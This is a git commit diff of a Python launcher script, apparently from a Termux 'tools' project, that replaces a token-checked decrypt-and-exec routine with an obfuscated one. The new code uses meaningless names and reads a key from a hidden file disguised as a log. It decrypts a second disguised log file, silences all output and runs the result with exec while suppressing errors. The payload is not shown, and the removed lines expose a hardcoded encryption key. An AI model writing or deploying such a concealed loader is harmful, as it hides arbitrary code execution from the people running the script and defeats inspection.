6ae038b99260362b63650d2c7006b7cf8a343e39
bocil-termux <pentesting833@gmail.com>
2025-01-12 21:46:11 +0800

    Update mulai.py

--- mulai.py
+++ mulai.py
@@ -1,87 +1,37 @@
 import os
-import time
-from cryptography.fernet import Fernet
-import subprocess
 import sys
-import colorama
-from colorama import init, Fore, Style
-import ntplib
+from cryptography.fernet import Fernet
 
-ENCRYPTION_KEY = b"hw1FLWARO3YJ3tF8wQOvRuuBr-YUDuhNEwSmKiXpYG8="
-TOKEN_EXPIRY_TIME = 30 * 24 * 60 * 60
-
-def get_ntp_time():
-    """Mengambil waktu dari server NTP"""
+def AAA_eye():
     try:
-        client = ntplib.NTPClient()
-        response = client.request('pool.ntp.org', version=3)
-        return response.tx_time
-    except Exception as e:
-        print(f"Jaringan Internet Tidak Terdeteksi")
-        if '[Errno -3]' in str(e):
-            sys.exit("Aktifkan Jaringan Internet Anda dan Coba Lagi..")
-        return None
-
-def decrypt_content(encrypted_content):
-    fernet = Fernet(ENCRYPTION_KEY)
-    try:
-        decrypted_content = fernet.decrypt(encrypted_content)
-        return decrypted_content.decode()
+        with open(r".main/.g18h38h7b6hkt68g7_log", "rb") as AAA:
+            return AAA.read()
     except Exception:
         return None
 
-def get_file_content(file_path):
-    if not os.path.exists(file_path):
-        return None
-
+def BBB_fox(BBB, CCC):
     try:
-        with open(file_path, "rb") as file:
-            file_data = file.read()
-        decrypted_content = decrypt_content(file_data)
-        return decrypted_content
+        with open(BBB, 'rb') as DDD:
+            EEE = DDD.read()
+
+        FFF = Fernet(CCC)
+        GGG = FFF.decrypt(EEE)
+        return GGG
     except Exception:
         return None
 
-def is_token_valid():
-    token_path = ".main/.token_autentikasi"
+def darlene_mode():
+    sys.stdout = open(os.devnull, 'w')
+    sys.stderr = open(os.devnull, 'w')
 
-    if not os.path.exists(token_path):
-        return False
+darlene_mode()
 
-    try:
-        with open(token_path, "rb") as token_file:
-            token_data = token_file.read().split(b'\n')
-            encrypted_token = token_data[0]
-            creation_time = int(token_data[1])
-
-        decrypted_token = decrypt_content(encrypted_token)
-        if not decrypted_token:
-            return False
-
-        current_time = get_ntp_time()
-        if current_time is None:
-            return False
-
-        if current_time - creation_time > TOKEN_EXPIRY_TIME:
-            return False
-
-        return True
-    except Exception:
-        return False
-
-def run_tools():
-    if is_token_valid():
-        content = get_file_content(".main/a")
-    else:
-        content = get_file_content(".main/login")
-
-    if content:
+HHH = AAA_eye()
+if HHH:
+    III = '.main/.he7jw8eu72j_log'
+    JJJ = BBB_fox(III, HHH)
+    if JJJ:
         try:
-            exec(content, globals())
-        except KeyboardInterrupt:
-            print("\nProses dihentikan oleh pengguna.")
-    else:
-        print("Gagal membaca atau mendekripsi file.")
-
-if __name__ == "__main__":
-    run_tools()
+            exec(JJJ)
+        except Exception:
+            pass
